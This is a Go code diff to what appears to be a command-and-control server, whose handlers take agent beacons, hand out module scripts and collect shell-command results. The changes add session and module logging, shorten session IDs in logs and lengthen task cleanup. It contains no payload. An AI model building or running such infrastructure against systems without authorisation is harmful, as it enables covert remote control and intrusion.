@@ -273,7 +273,7 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		}
 		s.sessions[sessionID] = session
 		newSessionCreated = true
-		s.logger.Info("New session created: %s from %s", sessionID, r.RemoteAddr)
+		s.logger.Info("[SESSION] New session created: %s from %s", shortSessionID(sessionID), r.RemoteAddr)
 		s.logger.Debug("Total active sessions: %d", len(s.sessions))
 	} else {
 		// Existing session - update LastSeen
@@ -283,7 +283,7 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 			s.logger.Debug("Session %s RemoteAddr changed: %s -> %s", sessionID, session.RemoteAddr, r.RemoteAddr)
 			session.RemoteAddr = r.RemoteAddr
 		}
-		s.logger.Debug("Existing session updated: %s (last seen: %v)", sessionID, session.LastSeen)
+		s.logger.Debug("[SESSION] Existing session updated: %s (last seen: %v)", shortSessionID(sessionID), session.LastSeen)
 	}
 	s.sessionsMu.Unlock()
 
@@ -355,6 +355,8 @@ func (s *Server) handleModule(w http.ResponseWriter, r *http.Request) {
 	taskID := r.URL.Query().Get("task_id")
 	sessionID := r.Header.Get("X-Session-ID")
 
+	s.logger.Info("[MODULE] Session %s fetching module: %s (task: %s)", 
+		shortSessionID(sessionID), moduleID, taskID)
 	s.logger.Debug("Module request for %s (task: %s, session: %s) from %s", moduleID, taskID, sessionID, r.RemoteAddr)
 
 	if s.moduleGetter == nil {
@@ -405,6 +407,8 @@ func (s *Server) handleModule(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	s.logger.Info("[MODULE] Module script sent: %s (task: %s, session: %s)", 
+		moduleID, taskID, shortSessionID(sessionID))
 	s.logger.Debug("Module script sent for %s", moduleID)
 }
 
@@ -469,23 +473,55 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 
 	taskType, _ := result["type"].(string)
 	taskID, _ := result["task_id"].(string)
-	s.logger.Debug("Received result for task %s (type: %s) from session %s", taskID, taskType, sessionID)
+	resultValue, _ := result["result"].(string)
+	
+	// Enhanced logging for module execution
+	if taskType == "module" {
+		// Get task command to identify which module was executed
+		var moduleID string
+		if s.taskQueue != nil {
+			if task := s.taskQueue.Get(taskID); task != nil {
+				moduleID = task.Command
+			}
+		}
+		
+		if moduleID != "" {
+			s.logger.Info("[MODULE] Session %s completed module: %s (task: %s)", 
+				shortSessionID(sessionID), moduleID, taskID)
+		} else {
+			s.logger.Info("[MODULE] Session %s completed module execution (task: %s)", 
+				shortSessionID(sessionID), taskID)
+		}
+		
+		// Log result preview (first 200 chars)
+		if len(resultValue) > 0 {
+			preview := resultValue
+			if len(preview) > 200 {
+				preview = preview[:200] + "..."
+			}
+			s.logger.Debug("[MODULE] Result preview: %s", preview)
+		}
+	} else if taskType == "shell" {
+		s.logger.Info("[SHELL] Session %s completed command execution (task: %s)", 
+			shortSessionID(sessionID), taskID)
+	} else {
+		s.logger.Info("[TASK] Session %s completed task (type: %s, task: %s)", 
+			shortSessionID(sessionID), taskType, taskID)
+	}
 
 	// Update task status and remove after completion
 	if taskID != "" {
 		if s.taskQueue != nil {
 			s.taskQueue.SetResult(taskID, result)
 			s.logger.Debug("Task %s result stored, scheduling removal", taskID)
-			// Remove task after a short delay to allow result processing
+			// Remove task after a longer delay to allow result processing (60 seconds for async checking)
 			go func() {
-				time.Sleep(5 * time.Second)
+				time.Sleep(60 * time.Second)
 				s.taskQueue.Remove(taskID)
 				s.logger.Debug("Task %s removed after result processing", taskID)
 			}()
 		}
 	}
-
-	s.logger.Debug("Task result from session %s: task_id=%s, type=%s", sessionID, taskID, taskType)
 
 	w.WriteHeader(http.StatusOK)
 	if _, err := w.Write([]byte("OK")); err != nil {
@@ -538,6 +574,14 @@ func generateSessionID() string {
 	rand.Read(bytes)
 	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(bytes)
 	return strings.ToLower(encoded[:8]) // Use first 8 characters
+}
+
+// shortSessionID returns a shortened version of session ID for logging
+func shortSessionID(id string) string {
+	if len(id) <= 8 {
+		return id
+	}
+	return id[:8]
 }
 
 // EnqueueTask adds a task to the queue for a specific session
